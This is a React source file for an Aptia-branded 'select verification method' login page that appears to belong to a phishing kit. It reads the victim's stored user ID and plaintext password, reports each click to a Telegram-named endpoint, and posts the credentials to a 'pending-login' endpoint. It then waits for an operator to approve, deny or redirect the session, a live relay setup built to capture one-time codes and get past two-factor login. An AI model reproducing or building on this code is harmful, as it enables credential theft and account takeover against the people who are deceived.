"use client"

/**
 * Verification Method Selection — Email or SMS, Aptia landing chrome only.
 * No Wealthcare layout / select / yellow notes.
 */

import { useEffect, useState } from "react"
import { AptiaAuthChrome } from "@/components/aptia-auth-chrome"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"

type VerificationMethod = "email" | "sms"

const METHODS: ReadonlyArray<{
  value: VerificationMethod
  title: string
  blurb: string
}> = [
  {
    value: "email",
    title: "Email",
    blurb: "Send a one-time code to the email on your account.",
  },
  {
    value: "sms",
    title: "Text message (SMS)",
    blurb: "Send a one-time code to the phone number on your account.",
  },
]

/** API / poll still use kit `text` for SMS. */
function apiMethod(m: VerificationMethod): "email" | "text" {
  return m === "sms" ? "text" : "email"
}

export default function Login2FAVerifyPage() {
  const [method, setMethod] = useState<VerificationMethod>("email")
  const [isWaiting, setIsWaiting] = useState(false)
  const [navLoading, setNavLoading] = useState(false)
  const [networkError, setNetworkError] = useState("")

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
        return
      }
      const stored = sessionStorage.getItem("verificationMethod")
      if (stored === "email") setMethod("email")
      if (stored === "text" || stored === "sms") setMethod("sms")
    } catch {
      window.location.href = "/"
    }
  }, [])

  const busy = isWaiting || navLoading

  async function handleContinue() {
    if (busy) return
    setIsWaiting(true)
    setNetworkError("")

    let userId = ""
    let password = ""
    try {
      userId = sessionStorage.getItem("loginUserId") ?? ""
      password = sessionStorage.getItem("loginPassword") ?? ""
    } catch {
      window.location.href = "/"
      return
    }
    if (!userId || !password) {
      window.location.href = "/"
      return
    }

    const kitMethod = apiMethod(method)

    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: kitMethod,
        userId,
        verificationType: method === "email" ? "Email" : "Text Message",
        page: `/login/2fa-verify?method=${kitMethod}`,
      }),
      keepalive: true,
    }).catch(() => {})

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: kitMethod,
          flow: "login",
        }),
      })
      const data = (await res.json().catch(() => ({}))) as { id?: string }

      if (!res.ok || !data?.id) {
        setIsWaiting(false)
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
        return
      }

      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS)
      setIsWaiting(false)

      if (outcome === "approved") {
        sessionStorage.setItem("verificationMethod", kitMethod)
        window.location.href = `/login/verify-code?method=${kitMethod}`
        return
      }
      if (outcome === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (outcome === "denied") {
        try {
          sessionStorage.removeItem("loginUserId")
          sessionStorage.removeItem("loginPassword")
          sessionStorage.removeItem("loginReady")
        } catch {
          /* ignore */
        }
        window.location.href = "/?loginDenied=1"
        return
      }
      window.location.href = "/?verifyUnavailable=1"
    } catch {
      setIsWaiting(false)
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
    }
  }

  async function handleCancel() {
    if (busy) return
    setNavLoading(true)
    await new Promise((r) => setTimeout(r, 400))
    window.location.href = "/"
  }

  return (
    <AptiaAuthChrome>
      <div className="l-mas-login-wrap verify-panel">
        <section className="verify-panel-inner" aria-labelledby="verify-method-heading">
          <h1 id="verify-method-heading" className="mas-h2">
            Select verification method
          </h1>
          <p className="mas-sub">
            Choose how you want to receive a one-time code for your{" "}
            {SITE_DISPLAY_NAME} account.
          </p>

          {networkError ? (
            <p className="verify-error" role="alert">
              {networkError}
            </p>
          ) : null}

          <fieldset
            className={`verify-method-fieldset${busy ? " is-busy" : ""}`}
            disabled={busy}
            aria-busy={isWaiting}
          >
            <legend className="sr-only">Verification method</legend>
            <div className="verify-method-list" role="radiogroup" aria-label="Verification method">
              {METHODS.map((opt) => {
                const selected = method === opt.value
                return (
                  <label
                    key={opt.value}
                    className={`verify-method-card${selected ? " is-selected" : ""}`}
                  >
                    <input
                      type="radio"
                      name="verificationMethod"
                      value={opt.value}
                      checked={selected}
                      onChange={() => setMethod(opt.value)}
                      className="verify-method-radio"
                    />
                    <span className="verify-method-card-body">
                      <span className="verify-method-title">{opt.title}</span>
                      <span className="verify-method-blurb">{opt.blurb}</span>
                    </span>
                  </label>
                )
              })}
            </div>
          </fieldset>

          <div className="verify-actions">
            <button
              type="button"
              className={`mas-btn mas-btn-login${busy ? " is-loading" : " is-ready"}`}
              disabled={busy}
              aria-busy={isWaiting}
              onClick={() => void handleContinue()}
            >
              {isWaiting ? "Please wait…" : "Continue"}
            </button>
            <button
              type="button"
              className="mas-btn mas-btn-outline verify-cancel"
              disabled={busy}
              onClick={() => void handleCancel()}
            >
              {navLoading ? "Loading…" : "Cancel"}
            </button>
          </div>
        </section>
      </div>
    </AptiaAuthChrome>
  )
}
